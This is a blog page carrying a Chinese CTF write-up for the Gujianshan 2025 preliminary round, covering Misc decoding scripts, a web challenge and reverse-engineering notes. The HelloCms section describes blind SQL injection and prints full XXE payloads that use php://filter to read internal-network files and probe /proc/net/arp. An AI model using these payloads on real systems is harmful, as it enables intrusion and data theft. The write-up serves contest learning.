<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>古剑山2025 初赛 Writeup | St4rr's Blog</title><meta name="author" content="St4rr"><meta name="copyright" content="St4rr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="跟校队大手子们打的，又被带飞了，混进决赛了）orzorzorz wp赛后一小时狂赶，比较草，直接贴这了（  Misc 水果 图片后藏压缩包   image-20251129121104368  看到提示oursecret，用oursecret对压缩包提取，猜测密码为shuiguo   image-20251129121437471  压缩包中的oursecret解">
<meta property="og:type" content="article">
<meta property="og:title" content="古剑山2025 初赛 Writeup">
<meta property="og:url" content="https://www.blog.st4rr.top/posts/4c6e0169/index.html">
<meta property="og:site_name" content="St4rr&#39;s Blog">
<meta property="og:description" content="跟校队大手子们打的，又被带飞了，混进决赛了）orzorzorz wp赛后一小时狂赶，比较草，直接贴这了（  Misc 水果 图片后藏压缩包   image-20251129121104368  看到提示oursecret，用oursecret对压缩包提取，猜测密码为shuiguo   image-20251129121437471  压缩包中的oursecret解">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.blog.st4rr.top/img/article/Black_hole.jpg">
<meta property="article:published_time" content="2025-11-29T16:00:00.000Z">
<meta property="article:modified_time" content="2025-12-11T12:12:12.649Z">
<meta property="article:author" content="St4rr">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="古剑山">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.blog.st4rr.top/img/article/Black_hole.jpg"><link rel="shortcut icon" href="/img/galaxy.jpeg"><link rel="canonical" href="https://www.blog.st4rr.top/posts/4c6e0169/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?11ae8bff5150c46570a0a934313effe5";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MGDNR814PE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MGDNR814PE');
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":200,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '古剑山2025 初赛 Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-12-11 20:12:12'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="/css/center-atom.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/grey_bwm.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/article/Black_hole.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="St4rr's Blog"><img class="site-icon" src="/img/earth.png"/><span class="site-name">St4rr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">古剑山2025 初赛 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-29T16:00:00.000Z" title="Created 2025-11-30 00:00:00">2025-11-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-11T12:12:12.649Z" title="Updated 2025-12-11 20:12:12">2025-12-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">7.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>39mins</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/4c6e0169/" data-flag-title="古剑山2025 初赛 Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/4c6e0169/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/4c6e0169/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>跟校队大手子们打的，又被带飞了，混进决赛了）orzorzorz</p>
<p>wp赛后一小时狂赶，比较草，直接贴这了（</p>
</blockquote>
<h2 id="misc">Misc</h2>
<h3 id="水果">水果</h3>
<p>图片后藏压缩包</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/image-20251129121104368.png"
alt="image-20251129121104368" />
<figcaption aria-hidden="true">image-20251129121104368</figcaption>
</figure>
<p>看到提示oursecret，用oursecret对压缩包提取，猜测密码为shuiguo</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/image-20251129121437471.png"
alt="image-20251129121437471" />
<figcaption aria-hidden="true">image-20251129121437471</figcaption>
</figure>
<p>压缩包中的oursecret解出来刚好16行，所以应该是吧它当作字典，对flag.txt中的每一行去其中查找行号0-f，得到一个hex字符串，然后from
hex</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 读取 OurSecret.txt 的所有行，去除末尾换行符</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;OurSecret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        secret_lines = [line.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建内容到行号（0-based）的映射字典，便于快速查找</span></span><br><span class="line">    content_to_index = &#123;content: idx <span class="keyword">for</span> idx, content <span class="keyword">in</span> <span class="built_in">enumerate</span>(secret_lines)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取 flag.txt 的每一行</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flag_lines = [line.rstrip(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line">    result_chars = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> flag_lines:</span><br><span class="line">        <span class="keyword">if</span> line <span class="keyword">not</span> <span class="keyword">in</span> content_to_index:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;未在 OurSecret.txt 中找到内容: &#x27;<span class="subst">&#123;line&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        idx = content_to_index[line]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= idx &lt;= <span class="number">9</span>:</span><br><span class="line">            result_chars.append(<span class="built_in">str</span>(idx))</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">10</span> &lt;= idx &lt;= <span class="number">15</span>:</span><br><span class="line">            result_chars.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (idx - <span class="number">10</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;行号 <span class="subst">&#123;idx&#125;</span> 超出允许范围（仅支持 0~15）&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(result_chars)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/image-20251129121956912.png"
alt="image-20251129121956912" />
<figcaption aria-hidden="true">image-20251129121956912</figcaption>
</figure>
<h3 id="hundred">hundred</h3>
<p>打着打着发现是原题https://www.cnblogs.com/ainsliaea/p/16683545.html</p>
<p>转置解压100层压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import zipfile</span><br><span class="line">import shutil</span><br><span class="line"></span><br><span class="line">def reverse_bytes(data: bytes) -&gt; bytes:</span><br><span class="line">    return data[::-1]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 初始输入文件</span><br><span class="line">    current_file = &#x27;attachment&#x27;</span><br><span class="line">    base_output_dir = &#x27;extracted&#x27;</span><br><span class="line"></span><br><span class="line">    # 清理并创建主输出目录</span><br><span class="line">    if os.path.exists(base_output_dir):</span><br><span class="line">        shutil.rmtree(base_output_dir)</span><br><span class="line">    os.makedirs(base_output_dir)</span><br><span class="line"></span><br><span class="line">    # 当前要处理的“压缩包”其实是上一步倒置后的数据</span><br><span class="line">    with open(current_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        current_data = f.read()</span><br><span class="line"></span><br><span class="line">    for level in range(2, 101):</span><br><span class="line">        # Step 1: 对当前数据按字节倒置 → 得到一个 ZIP 文件内容</span><br><span class="line">        zip_data = reverse_bytes(current_data)</span><br><span class="line"></span><br><span class="line">        # Step 2: 创建本层解压目录</span><br><span class="line">        layer_dir = os.path.join(base_output_dir, f&#x27;layer_&#123;level-1&#125;&#x27;)  # layer_1 对应解压 attachment 得到 flag2</span><br><span class="line">        os.makedirs(layer_dir, exist_ok=True)</span><br><span class="line"></span><br><span class="line">        # Step 3: 尝试作为 ZIP 解压</span><br><span class="line">        try:</span><br><span class="line">            with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:</span><br><span class="line">                zf.extractall(layer_dir)</span><br><span class="line">                extracted_files = zf.namelist()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;[!] 在 layer_&#123;level-1&#125; 解压失败（期望得到 flag&#123;level&#125;）: &#123;e&#125;&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        print(f&quot;[+] Layer &#123;level-1&#125;: 解压成功，文件列表: &#123;extracted_files&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # Step 4: 在解压出的文件中寻找下一个目标文件：flag&#123;level&#125;</span><br><span class="line">        next_flag_name = f&#x27;flag&#123;level&#125;&#x27;</span><br><span class="line">        next_flag_path = os.path.join(layer_dir, next_flag_name)</span><br><span class="line"></span><br><span class="line">        # 如果存在 flag&#123;level&#125;，就读取它作为下一轮的 current_data</span><br><span class="line">        if os.path.isfile(next_flag_path):</span><br><span class="line">            with open(next_flag_path, &#x27;rb&#x27;) as f:</span><br><span class="line">                current_data = f.read()</span><br><span class="line">            # 继续下一轮</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;[!] 未找到 &#123;next_flag_name&#125;，停止处理。&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        # 如果已经到 flag99，不再继续下一轮（因为没有 flag100）</span><br><span class="line">        if level == 100:</span><br><span class="line">            print(&quot;[+] 已处理至 flag99，结束。&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print(f&quot;\n[✓] 所有解压内容已保存至 &#x27;&#123;base_output_dir&#125;&#x27; 目录。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    import io  # 放在这里避免顶层 import 问题</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>得到secret.txt和hint.txt，编写正则表达式提取到base</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&#x27;enc.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    pat = re.compile(r&#x27;\d[a-z]&#123;5&#125;[A-Z][^A-Z](.)[a-z]\d&#123;2&#125;[A-Z]\D&#x27;)</span><br><span class="line">    print(pat.findall(f.read()))</span><br></pre></td></tr></table></figure>
<p>然后解一下就能得到flag</p>
<p>flag{74c959166bc7fbaacaa4d77cf692b1c7}</p>
<h3 id="sudoku">sudoku</h3>
<p>仍然接近原题https://w3nx1z1.github.io/posts/352a8c69.html</p>
<p>解数独和找flag还原的事</p>
<p>flag{4e4d6c332b6fe62a63afe56171fd3725}</p>
<h2 id="web">Web</h2>
<h3 id="baby_ssti">baby_ssti</h3>
<p>fenjing一把梭</p>
<figure>
<img
src="/images/古剑山2025-初赛-Writeup/Screenshot%202025-11-29%20092804.png"
alt="Screenshot 2025-11-29 092804" />
<figcaption aria-hidden="true">Screenshot 2025-11-29 092804</figcaption>
</figure>
<h3 id="hellocms">HelloCms</h3>
<p>先对目标网站 http://120.79.131.78:38888 SQL 注入，用 bp 的 Intruder
进行盲注爆破。</p>
<p>爆出来数据库名为 heavysql 。表名为 users 。列名包括：id, username,
password, user, current_connections 。</p>
<p>之后得到密码 kingdom123ABC</p>
<p>进入之后有一个 xxe</p>
<p>利用 XXE 读取了服务器的 ARP 缓存表文件
/proc/net/arp，发现内网中还有其他存活主机</p>
<p>用<code>&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://172.17.0.3/index.php"&gt;]&gt;&lt;ANY&gt;&lt;name&gt;&amp;xxe; &lt;/name&gt;&lt;/ANY&gt;</code>读取
172.17.0.3 的 index.php</p>
<p>得到</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/image-20251129125415975.png"
alt="image-20251129125415975" />
<figcaption aria-hidden="true">image-20251129125415975</figcaption>
</figure>
<p>然后同样伪协议读取
flag.php<code>&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://172.17.0.3/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php"&gt;]&gt;&lt;ANY&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/ANY&gt;</code></p>
<p>得到 flag</p>
<h2 id="reverse">Reverse</h2>
<h3 id="babyre">babyre</h3>
<p>绕过反调试，修改SF值</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/202511291209041.png"
alt="image-20251129120857935" />
<figcaption aria-hidden="true">image-20251129120857935</figcaption>
</figure>
<p>主逻辑在这里，off_6CB090指向Input的+10字节偏移的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400CCE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-1C4h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-1C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-1B0h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">408</span>]; <span class="comment">// [rsp+30h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v7, <span class="string">&quot;vpff`vv$&quot;</span>, <span class="number">8</span>);                   <span class="comment">// success!</span></span><br><span class="line">  qmemcpy(v6, <span class="string">&quot;cdli$&quot;</span>, <span class="number">5</span>);                      <span class="comment">// fail</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    v7[i] ^= <span class="number">5u</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">    v6[j] ^= <span class="number">5u</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)off_6CB090 == <span class="number">0x7D646F6F675F7369</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = sub_4289B0((<span class="type">const</span> __m128i *)off_6CB090);</span><br><span class="line">    KSA((__int64)v8, (__int64)off_6CB090, v0);</span><br><span class="line">    LODWORD(v1) = sub_4289B0((<span class="type">const</span> __m128i *)((<span class="type">char</span> *)off_6CB090 - <span class="number">10</span>));</span><br><span class="line">    RC4((__int64)v8, (__int64)off_6CB090 - <span class="number">10</span>, v1);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)((<span class="type">char</span> *)off_6CB090 - <span class="number">10</span>) == <span class="number">0x2F34ED427B495C01</span>LL</span><br><span class="line">      &amp;&amp; *(_QWORD *)((<span class="type">char</span> *)off_6CB090 - <span class="number">2</span>) == <span class="number">0x8B526A1E2EABAA4F</span>LL</span><br><span class="line">      &amp;&amp; *(_QWORD *)((<span class="type">char</span> *)off_6CB090 + <span class="number">6</span>) == <span class="number">0x840F</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400F40(<span class="number">1u</span>, v7, <span class="number">8uLL</span>);</span><br><span class="line">      sub_413A60(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_400F40(<span class="number">1u</span>, v6, <span class="number">5uLL</span>);</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_447DC0(<span class="number">1LL</span>, v6, v2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x7D646F6F675F7369LL小端序就是，RC4解密</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/202511291210954.png"
alt="image-20251129121038842" />
<figcaption aria-hidden="true">image-20251129121038842</figcaption>
</figure>
<h3 id="helloworld">helloworld</h3>
<p>主函数：</p>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/clip_image002.jpg"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<figure>
<img src="/images/古剑山2025-初赛-Writeup/clip_image004.jpg"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
